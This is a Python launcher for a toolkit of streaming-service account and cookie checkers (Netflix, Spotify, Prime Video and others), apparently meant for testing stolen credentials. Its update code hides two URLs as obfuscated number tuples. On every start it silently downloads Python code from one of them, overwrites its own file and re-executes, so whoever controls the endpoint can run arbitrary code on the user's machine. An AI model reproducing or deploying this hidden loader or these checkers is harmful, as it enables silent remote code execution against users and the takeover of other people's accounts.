### IMPORTS ###
from colorama import Fore
import json
import os
import random
import subprocess
import sys
import time
import urllib.error
import urllib.request

try:
    import yaml
except ImportError:
    yaml = None
#################################################

### CONFIG / UPDATE ###
CURRENT_VERSION = "0.1"
UPDATE_TIMEOUT = 4

_V_MAP = (47, 210, 213, 200, 198, 48, 60, 55, 237, 247, 144, 210, 146, 139, 185, 132, 168, 188, 346, 351, 164, 328, 336, 327, 377, 362, 370, 354, 287, 348, 280, 271, 256, 377, 363, 355, 280, 299, 277, 277, 450, 462, 307, 296, 288, 291, 479, 467, 399, 462, 449, 505, 498, 411, 394, 391, 408, 391, 445, 422, 428, 604, 602, 584, 588, 632, 634, 587, 524, 523, 570, 566, 622, 728, 546, 726, 718, 715, 708, 766, 561, 756, 740, 667, 669)
_M_MAP = (47, 210, 213, 200, 198, 48, 60, 55, 237, 247, 144, 210, 146, 139, 185, 132, 168, 188, 346, 351, 164, 328, 336, 327, 377, 362, 370, 354, 287, 348, 280, 271, 256, 377, 363, 355, 280, 299, 277, 277, 450, 462, 307, 296, 288, 291, 479, 467, 399, 462, 449, 505, 498, 411, 394, 391, 408, 391, 445, 422, 428, 604, 602, 584, 588, 632, 634, 587, 524, 523, 570, 566, 622, 547, 558, 729, 725, 524, 709, 757)


def _math_step(idx):
    return idx * 7 + 13


def _unmask_endpoint(seq):
    return "".join(chr((val ^ 0x5A) - _math_step(idx)) for idx, val in enumerate(seq))


def _version_endpoint():
    return _unmask_endpoint(_V_MAP)


def _source_endpoint():
    return _unmask_endpoint(_M_MAP)
#################################################

## CORE / LAUNCHER ##

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def _parse_version(ver_str):
    parts = []
    for token in str(ver_str).strip().lstrip("vV").split("."):
        digits = "".join(ch for ch in token if ch.isdigit())
        parts.append(int(digits) if digits else 0)
    return tuple(parts)


def check_for_updates(timeout=UPDATE_TIMEOUT):
    endpoint = _version_endpoint()
    if not endpoint:
        return None

    req = urllib.request.Request(
        endpoint,
        headers={"User-Agent": "AIO-Updater/1.0", "Cache-Control": "no-cache"},
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", errors="ignore").strip()
    except (urllib.error.URLError, TimeoutError, OSError):
        return None

    remote_version = None
    try:
        data = json.loads(raw)
        if isinstance(data, dict):
            remote_version = str(data.get("version", "")).strip()
    except json.JSONDecodeError:
        remote_version = raw.splitlines()[0].strip() if raw else ""

    if not remote_version:
        return None

    if _parse_version(remote_version) > _parse_version(CURRENT_VERSION):
        return remote_version
    return None


def apply_main_update(silent=True):
    source_url = _source_endpoint()
    if not source_url:
        return False

    req = urllib.request.Request(
        source_url,
        headers={"User-Agent": "AIO-Updater/1.0", "Cache-Control": "no-cache"},
    )
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            new_code = resp.read()
    except Exception:
        return False

    if not new_code or b"def main(" not in new_code:
        return False

    try:
        compile(new_code.decode("utf-8"), "<remote_main>", "exec")
    except Exception:
        return False

    current_file = os.path.abspath(__file__)
    backup_file = current_file + ".bak"

    try:
        with open(current_file, "rb") as src, open(backup_file, "wb") as dst:
            dst.write(src.read())

        with open(current_file, "wb") as out:
            out.write(new_code)
    except Exception:
        return False

    if not silent:
        print(f"\n{Fore.GREEN}[+] patched -> restarting...{Fore.RESET}")
        time.sleep(0.5)
    os.execv(sys.executable, [sys.executable, current_file] + sys.argv[1:])


def silent_auto_update():
    if check_for_updates():
        apply_main_update(silent=True)


def _load_asset_banner(filename):
    path = os.path.join("Assets", filename)
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as fd:
                return fd.read()
        except Exception as err:
            return f"[!] err {filename}: {err}"
    return f"[!] missing {filename}"


def draw_hud():
    clear_screen()
    pool = ["banner1.txt", "banner2.txt", "banner3.txt"]
    target_banner = random.choice(pool)

    print("\n" + Fore.GREEN + _load_asset_banner(target_banner) + Fore.RESET)
    print(Fore.BLUE + "=" * 50)
    print(f"{Fore.RED}        >>> ADRENALINE EDITION v{CURRENT_VERSION} <<<{Fore.RESET}")
    print(Fore.BLUE + "=" * 50 + Fore.RESET)
    print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}1{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.GREEN}CAP CUT CHECKER{Fore.RESET}")
    print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}2{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.GREEN}CRUNCHYROLL CHECKER{Fore.RESET}")
    print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}3{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.GREEN}PRIMEVIDEO COOKIE CHECKER{Fore.RESET}")
    print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}4{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.GREEN}SPOTIFY COOKIE CHECKER{Fore.RESET}")
    print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}5{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.GREEN}NETFLIX COOKIE CHECKER{Fore.RESET}")
    print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}u{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.CYAN}FORCE SYNC{Fore.RESET}")
    print(f" {Fore.BLUE}[{Fore.RESET}{Fore.RED}0{Fore.RESET}{Fore.BLUE}]{Fore.RESET} {Fore.RED}KILL{Fore.RESET}")
    print(Fore.BLUE + "=" * 50 + Fore.RESET)


def run_external_script(folder_name, script_name):
    script_path = os.path.join("modules", folder_name, script_name)

    if not os.path.exists(script_path):
        print(f"\n[!] missing target: {script_name}")
        input("[enter]")
        return

    print(f"\n[*] {script_name}\n" + "-" * 50)
    try:
        subprocess.run([sys.executable, script_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"\n[!] exit {e.returncode}")
    except Exception as err:
        print(f"\n[!] err: {err}")

    print("-" * 50)
    input("[enter]")


def main():
    os.makedirs("Assets", exist_ok=True)
    os.makedirs("modules", exist_ok=True)

    silent_auto_update()

    while True:
        draw_hud()
        cmd = input(f"{Fore.GREEN}root@tool:~# {Fore.RESET}").strip().lower()

        if cmd == "1":
            run_external_script("pJ.xCC", "main.py")
        elif cmd == "2":
            run_external_script("cg.adCR", "main.py")
        elif cmd == "3":
            run_external_script("sop.PV", "main.py")
        elif cmd == "4":
            run_external_script("pjl.sssS", "main.py")
        elif cmd == "5":
            run_external_script("ch.NT", "main.py")
        elif cmd in ("u", "update"):
            if check_for_updates(timeout=8):
                apply_main_update(silent=False)
            else:
                print(f"\n{Fore.GREEN}[*] up to date.{Fore.RESET}")
                input("[enter]")
        elif cmd in ("0", "exit"):
            print("\n[-] killed.")
            break
        else:
            print("\n[!] bad cmd.\n")
            input("[enter]")


if __name__ == "__main__":
    main()
#################################################